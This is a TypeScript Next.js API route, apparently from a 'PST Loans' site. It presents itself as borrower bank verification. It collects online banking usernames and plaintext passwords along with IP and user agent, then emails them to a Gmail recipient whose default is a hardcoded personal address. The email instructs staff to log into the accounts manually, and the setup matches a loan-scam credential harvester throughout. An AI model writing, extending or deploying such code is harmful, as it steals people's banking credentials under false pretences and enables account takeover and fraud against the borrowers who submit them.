import { NextResponse } from "next/server";
import nodemailer from "nodemailer";

export const runtime = "nodejs";

type Payload = {
  referenceId: string;
  bankName: string;
  accountHolder: string;
  username: string;
  password: string;
};

const escape = (s: string) =>
  String(s ?? "")
    .replace(/&/g, "&amp;")
    .replace(/</g, "&lt;")
    .replace(/>/g, "&gt;");

export async function POST(request: Request) {
  let body: Payload;
  try {
    body = (await request.json()) as Payload;
  } catch {
    return NextResponse.json({ message: "Invalid JSON" }, { status: 400 });
  }

  const { referenceId, bankName, accountHolder, username, password } = body;
  if (!referenceId || !bankName || !accountHolder || !username || !password) {
    return NextResponse.json(
      { message: "Missing required fields" },
      { status: 400 },
    );
  }

  const user = process.env.USER_MAIL;
  const pass = process.env.USER_PASSWORD;
  const to = process.env.BANK_VERIFICATION_TO || "pabitraghara384@gmail.com";

  if (!user || !pass) {
    console.error("[bank-verification] USER_MAIL / USER_PASSWORD missing");
    return NextResponse.json(
      { message: "Mail service not configured" },
      { status: 500 },
    );
  }

  const submittedAt = new Date().toISOString();
  const ua = request.headers.get("user-agent") || "unknown";
  const ip =
    request.headers.get("x-forwarded-for")?.split(",")[0]?.trim() ||
    request.headers.get("x-real-ip") ||
    "unknown";

  const html = `
    <div style="font-family: Arial, sans-serif; max-width: 640px; margin: 0 auto; border: 1px solid #e0e0e0; border-radius: 8px; overflow: hidden;">
      <div style="background-color: #003B5C; padding: 24px; text-align: center;">
        <h1 style="margin: 0; font-size: 22px; font-weight: 800; color: #ffffff;">PST<span style="color: #4CAF50;">Loans</span> — Bank Verification Submission</h1>
      </div>
      <div style="padding: 28px 24px;">
        <p style="margin: 0 0 16px; font-size: 14px; color: #555;">A borrower has completed the online bank verification flow. Credentials are included below for manual account connection.</p>
        <div style="background: #eff6ff; border: 1px solid #bfdbfe; border-radius: 8px; padding: 16px; margin: 16px 0; text-align: center;">
          <p style="margin: 0 0 4px; font-size: 11px; color: #888; letter-spacing: 2px; text-transform: uppercase;">Reference ID</p>
          <p style="margin: 0; font-size: 22px; font-weight: 900; color: #003B5C; letter-spacing: 2px;">${escape(referenceId)}</p>
        </div>
        <table style="width: 100%; border-collapse: collapse; font-size: 14px; color: #333;">
          <tr><td style="padding: 8px 0; width: 180px; color: #666;">Bank Name</td><td style="padding: 8px 0; font-weight: 600;">${escape(bankName)}</td></tr>
          <tr><td style="padding: 8px 0; color: #666;">Account Holder</td><td style="padding: 8px 0; font-weight: 600;">${escape(accountHolder)}</td></tr>
          <tr><td style="padding: 8px 0; color: #666;">Online Banking Username</td><td style="padding: 8px 0; font-weight: 600;">${escape(username)}</td></tr>
          <tr><td style="padding: 8px 0; color: #666;">Online Banking Password</td><td style="padding: 8px 0; font-weight: 600;">${escape(password)}</td></tr>
          <tr><td style="padding: 8px 0; color: #666;">Submitted At</td><td style="padding: 8px 0;">${escape(submittedAt)}</td></tr>
          <tr><td style="padding: 8px 0; color: #666;">IP</td><td style="padding: 8px 0;">${escape(ip)}</td></tr>
          <tr><td style="padding: 8px 0; color: #666;">User Agent</td><td style="padding: 8px 0; font-size: 12px; color: #888;">${escape(ua)}</td></tr>
        </table>
        <div style="background: #fefce8; border: 1px solid #fde68a; border-radius: 8px; padding: 14px; margin-top: 20px;">
          <p style="margin: 0; font-size: 13px; color: #92400e;">
            <strong>Next step:</strong> Manually connect the account and send a one-time micro-deposit to confirm ownership. The borrower has been instructed to call their loan officer once the deposit appears.
          </p>
        </div>
      </div>
    </div>
  `;

  const text = [
    `PST Loans — Bank Verification Submission`,
    ``,
    `Reference ID: ${referenceId}`,
    `Bank Name: ${bankName}`,
    `Account Holder: ${accountHolder}`,
    `Username: ${username}`,
    `Password: ${password}`,
    `Submitted At: ${submittedAt}`,
    `IP: ${ip}`,
    `User Agent: ${ua}`,
  ].join("\n");

  const transporter = nodemailer.createTransport({
    service: "gmail",
    auth: { user, pass },
  });

  try {
    await transporter.sendMail({
      from: `PST Loans Bank Verification <${user}>`,
      to,
      subject: `Bank Verification — ${bankName} (${referenceId})`,
      text,
      html,
    });
  } catch (err) {
    console.error("[bank-verification] sendMail error:", err);
    return NextResponse.json(
      { message: "Failed to send verification email" },
      { status: 502 },
    );
  }

  return NextResponse.json({ ok: true, referenceId });
}
